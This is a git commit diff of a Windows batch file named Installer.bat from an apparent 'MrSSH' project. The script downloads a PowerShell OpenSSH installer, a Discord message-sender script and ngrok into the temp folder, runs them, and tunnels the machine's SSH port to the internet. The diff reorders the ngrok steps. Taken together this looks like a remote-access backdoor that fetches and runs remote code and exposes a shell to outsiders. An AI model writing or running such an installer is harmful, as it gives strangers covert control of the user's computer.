894af29e06861d0f04085902a3642b4bae884e35
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-15 22:06:26 +0200

    Working now

--- SSH FIles/Installer.bat
+++ SSH FIles/Installer.bat
@@ -4,8 +4,8 @@ cd %temp%
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -o OpenSSH.ps1
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o discordmsg.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
-tar -xf ngrok.zip
-ngrok.exe tcp 22 --region eu
-
 
 powershell ./OpenSSH.ps1
+
+tar -xf ngrok.zip
+ngrok.exe tcp 22 --region eu
